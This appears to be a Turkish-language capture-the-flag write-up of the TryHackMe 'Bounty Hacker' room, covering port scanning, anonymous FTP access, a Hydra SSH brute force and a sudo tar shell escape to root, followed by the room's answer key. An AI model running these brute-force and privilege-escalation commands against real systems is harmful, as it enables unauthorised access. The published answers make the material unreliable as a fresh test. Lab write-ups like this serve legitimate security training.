# TryHackMe - Bounty Hacker Write-Up

Bu write-up'ta TryHackMe odasında gerçekleştirilen keşif (enumeration), ilk erişim (initial access) ve yetki yükseltme (privilege escalation) adımlarını inceleyeceğiz.
a
---

# Nmap Scan

İlk olarak hedef makine üzerinde servis keşfi gerçekleştirdim.

```bash
nmap -sC -sV -T5 <TARGET_IP>
```

Sonuçlar:

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.5 |
| 22 | SSH | OpenSSH 8.2p1 |
| 80 | HTTP | Apache 2.4.41 |

İlk dikkat çeken nokta FTP servisinin **Anonymous Login** kabul etmesiydi.

---

# Web Enumeration

Web dizinlerini keşfetmek amacıyla ffuf kullandım.

```bash
ffuf -w /usr/share/wordlists/dirb/big.txt \
-u http://<TARGET_IP>/FUZZ \
-fc 404 \
-e .php,.html,.txt,.bak \
-t 100
```

Bulunan dizinler:

- images/
- javascript/

Dikkat çekici herhangi bir dosya bulunmadığından FTP servisine yöneldim.

---

# FTP Anonymous Login

FTP servisine anonymous kullanıcı ile giriş yaptım.

```bash
ftp <TARGET_IP>
```

```text
Name: anonymous
230 Login successful.
```

Dizin listelendiğinde iki dosya bulundu.

```text
locks.txt
task.txt
```

Dosyaları kendi makinama indirdim.

```bash
get task.txt
get locks.txt
```

---

# Analysing task.txt

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

Notun sonunda bulunan imza sayesinde kullanıcı adının **lin** olduğu anlaşılıyor.

---

# Analysing locks.txt

`locks.txt` içerisinde çok sayıda parola adayı bulunuyordu.

Dosya, SSH veya FTP brute-force saldırısı için hazırlanmış bir parola listesi görünümündeydi.

---

# Brute Force

Önce FTP üzerinde deneme yaptım.

```bash
hydra -l lin -P locks.txt ftp://<TARGET_IP> -t 4
```

Herhangi bir sonuç alınamadı.

Ardından aynı liste SSH servisi üzerinde denendi.

```bash
hydra -l lin -P locks.txt ssh://<TARGET_IP> -t 4
```

Hydra başarılı şekilde kullanıcı parolasını buldu.

```text
login: lin
password: RedDr4gonSynd1cat3
```

---

# SSH Access

Bulunan bilgiler ile sisteme giriş yapıldı.

```bash
ssh lin@<TARGET_IP>
```

Kullanıcının masaüstünde user flag bulundu.

```bash
cat ~/Desktop/user.txt
```

```text
THM{REDACTED}
```

---

# Privilege Escalation

Öncelikle sudo yetkileri kontrol edildi.

```bash
sudo -l
```

Çıktı:

```text
(root) /bin/tar
```

Kullanıcının parola ile `/bin/tar` komutunu root olarak çalıştırabildiği görüldü.

GTFOBins üzerinde bulunan `tar` privilege escalation yöntemi kullanıldı.

```bash
sudo tar cf /dev/null /dev/null \
--checkpoint=1 \
--checkpoint-action=exec=/bin/sh
```

Komut çalıştırıldıktan sonra root shell elde edildi.

```bash
whoami
```

```text
root
```

---

# Root Flag

```bash
cd /root
cat root.txt
```

```text
THM{REDACTED}
```

---

# Answers

| Question | Answer |
|----------|--------|
| Find open ports on the machine | 21,22,80 |
| Who wrote the task list? | lin |
| What service can you bruteforce with the text file found? | SSH |
| What is the users password? | RedDr4gonSynd1cat3 |
| user.txt | THM{REDACTED} |
| root.txt | THM{REDACTED} |

---

# Tools Used

- Nmap
- FFUF
- FTP
- Hydra
- SSH
- GTFOBins (tar)

---

# Attack Path

```
Nmap
      │
      ▼
Anonymous FTP
      │
      ▼
Download task.txt & locks.txt
      │
      ▼
Find username (lin)
      │
      ▼
Hydra SSH Brute Force
      │
      ▼
SSH Login
      │
      ▼
sudo -l
      │
      ▼
tar (GTFOBins)
      │
      ▼
Root
```

---

## Conclusion

Bu odada ilk erişim, yanlış yapılandırılmış **Anonymous FTP** servisi sayesinde elde edildi. FTP üzerinden indirilen dosyalar kullanıcı adı ve parola listesini sağladı. SSH brute-force sonucunda sisteme kullanıcı olarak giriş yapıldı. Son aşamada ise `sudo` üzerinden yetkili çalıştırılabilen **tar** ikilisi, GTFOBins tekniği kullanılarak root yetkisi elde etmek için istismar edildi.
